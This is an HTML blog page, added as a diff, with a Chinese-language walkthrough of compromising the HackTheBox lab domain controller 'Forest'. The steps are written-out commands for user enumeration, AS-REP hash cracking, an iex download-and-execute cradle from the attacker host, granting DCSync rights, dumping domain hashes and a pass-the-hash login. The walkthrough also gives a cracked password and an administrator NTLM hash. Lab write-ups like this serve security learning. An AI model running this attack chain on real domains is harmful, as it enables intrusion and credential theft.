@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>forest | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan  从已经获取的信息来看，这像一个AD域控 重点需要关注389,445和5985端口 5985应该是kerberos认证中最后一次要请求的http service  枚举域内用户及其密码445端口一般是smb服务，所以可以尝试smbmap或smbclient进行枚举smbmap -H 10.10.10.161smbclient -N -L &#x2F;&#x2F;10.10.10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="forest">
+<meta property="og:url" content="http://example.com/2022/08/30/forest/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan  从已经获取的信息来看，这像一个AD域控 重点需要关注389,445和5985端口 5985应该是kerberos认证中最后一次要请求的http service  枚举域内用户及其密码445端口一般是smb服务，所以可以尝试smbmap或smbclient进行枚举smbmap -H 10.10.10.161smbclient -N -L &#x2F;&#x2F;10.10.10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/nmap.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/nmap2.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/smb.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/rpcclient.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/rpc2.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/rpc3.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/rpc4.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/ntlmhash.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/hashcat.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/user.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/info.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/hash.png">
+<meta property="og:image" content="http://example.com/2022/08/30/forest/root.png">
+<meta property="article:published_time" content="2022-08-31T01:39:19.000Z">
+<meta property="article:modified_time" content="2022-09-01T08:04:06.977Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/30/forest/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-forest" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/30/forest/" class="article-date">
+  <time class="dt-published" datetime="2022-08-31T01:39:19.000Z" itemprop="datePublished">2022-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      forest
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/forest/nmap.png">
+<img src="/2022/08/30/forest/nmap2.png">
+从已经获取的信息来看，这像一个AD域控
+重点需要关注389,445和5985端口
+5985应该是kerberos认证中最后一次要请求的http service
+
+<h4 id="枚举域内用户及其密码"><a href="#枚举域内用户及其密码" class="headerlink" title="枚举域内用户及其密码"></a>枚举域内用户及其密码</h4><p>445端口一般是smb服务，所以可以尝试smbmap或smbclient进行枚举<br>smbmap -H 10.10.10.161<br>smbclient -N -L &#x2F;&#x2F;10.10.10.161<br>均没有获得有用的信息<br><img src="/2022/08/30/forest/smb.png"></p>
+<p>rpcclient -U “” -N 10.10.10.161<br>enumdomuser<br><img src="/2022/08/30/forest/rpcclient.png"><br>enudomgroups<br><img src="/2022/08/30/forest/rpc2.png"><br>同时也能查询用户组和其中的用户<br>querygroup 0x200<br>querygroupmem 0x200<br><img src="/2022/08/30/forest/rpc3.png"><br>queryuser 0x1f4<br><img src="/2022/08/30/forest/rpc4.png"></p>
+<p>将刚刚查询到的username存入username.txt<br>使用工具impacket爆破以上用户的hash<br><img src="/2022/08/30/forest/ntlmhash.png"><br>接着用hashcat爆破这个hash值<br><code>hashcat -m 18200 svc /usr/share/wordlists/rockyou.txt --force</code><br><img src="/2022/08/30/forest/hashcat.png"><br>得到密码为<code>s3rvice</code><br>使用工具evil-winrm进行连接<br><code>evil-winrm -i 10.10.10.161 -u &#39;svc-alfresc&#39; -p &#39;s3rvice&#39;</code><br><img src="/2022/08/30/forest/user.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><h5 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h5><p>使用sharphound进行信息收集<br>可以直接上传也能用目标机去主动下载<br><code>iex(new-object net.webclient).downloadstring(&quot;http://10.10.14.4/SharpHound.ps1&quot;)</code></p>
+<p>接下来收集域内信息<br><code>import-module .\SharpHound.ps1</code><br><code>invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</code><br><img src="/2022/08/30/forest/info.png"><br>收集到的信息为一个zip文件<br>用本机开一个smbserver去接收这个zip并放到bloodhound里分析<br>从当前 svc-alfresco 的访问权限到 Domain Admins 组中的 Adminsitrator 需要两个步骤。<br>1）svc-alfresco 用户在 Service Account 中，它是 Privileged IT Account 的成员，它是 Account Operators 的成员，所以svc-alfresco 用户是 Account Operators 的成员，并且 Account Operators 对 Exchange Windows Permissions 组具有 Generic All 特权。<br>解释：Account Operators 组授予用户有限的帐户创建权限。该组的成员可以创建和修改大多数类型的帐户，包括用户、本地组和全局组的帐户，并且成员可以本地登录到域控制器。所以可以新建一个abc用户并加入 “Exchange Windows Permissions”组。<br>&#96;<br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; net user abc abc123! &#x2F;add &#x2F;domain<br>The command completed successfully.</p>
+<p><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; net group “Exchange Windows Permissions” abc &#x2F;add<br>The command completed successfully.<br><code>2) 组 EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL 的成员有权修改域 HTB.LOCAL 上的 DACL（自由访问控制列表）。通过对目标对象的 DACL 的写入访问权限，您可以授予对对象的任何所需权限。这里是为abc用户赋予DCSync权限，利用DCSync导出域内所有用户hash。</code><br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; $SecPassword &#x3D; ConvertTo-SecureString ‘abc123!’ -AsPlain -Force<br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; $Cred &#x3D; New-Object System.Management.Automation.PSCredential(‘htb\abc’, $SecPassword)</p>
+<p><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\PowerView.ps1<br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Documents&gt; Add-DomainObjectAcl -PrincipalIdentity abc -Credential $Cred  -Rights DCSync<br>&#96;</p>
+<p>域内用户hash值获取<br><code>impacket-secretsdump htb.local/abc@10.10.10.161</code><br><img src="/2022/08/30/forest/hash.png"><br>用wmiexe进行hash传递攻击<br><code>impacket-wmiexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</code><br><img src="/2022/08/30/forest/root.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/30/forest/" data-id="cl7irmudd0001d2cp7iyd0h61" data-title="forest" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/01/blunder/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          blunder
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/08/30/Admirer/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Admirer</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
